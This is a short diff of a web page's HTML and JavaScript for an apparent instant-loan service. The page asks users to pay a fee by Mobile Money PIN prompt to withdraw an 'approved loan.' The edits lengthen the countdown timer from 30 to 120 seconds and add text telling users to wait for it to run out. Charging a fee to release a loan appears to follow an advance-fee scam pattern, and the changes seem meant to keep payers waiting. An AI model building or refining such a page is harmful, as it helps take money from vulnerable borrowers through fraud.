@@ -1922,7 +1922,7 @@
               </div>
           </div>
 
-          <p class="text-center text-sm text-gray-500 mb-6 px-2">Pay the fee below to instantly withdraw your approved loan to your Mobile Money account.</p>
+          <p class="text-center text-sm text-gray-500 mb-6 px-2">Pay the fee below to instantly withdraw your approved loan to your Mobile Money account. after requesting withdrawal,wait untill the timer elapses.</p>
 
           <!-- Main Card area (STK Push Container) -->
           <div class="card" id="mainCard" style="max-width: 100%;">
@@ -1940,7 +1940,7 @@
                   <p style="color: #64748b; font-size: 14px; margin-bottom: 16px;" id="stkMessage">
                       STK push sent to <span id="stkPhoneDisplay" class="font-bold text-gray-800">...</span>. Enter your PIN to pay <span id="stkFeeDisplay" class="font-bold text-gray-800">...</span> to allow withdrawal of <span id="stkAmountDisplay" class="font-bold text-gray-800">...</span> instantly.
                   </p>
-                  <div class="timer" id="countdownTimer">30</div>
+                  <div class="timer" id="countdownTimer">120</div>
                   <p style="color: var(--text-muted); font-size: 12px;">Seconds remaining</p>
               </div>
 
@@ -2568,7 +2568,7 @@
               });
               
               function startTimer() {
-                  let timeLeft = 30;
+                  let timeLeft = 120;
                   const timerEl = document.getElementById('countdownTimer');
                   timerEl.textContent = timeLeft;
 
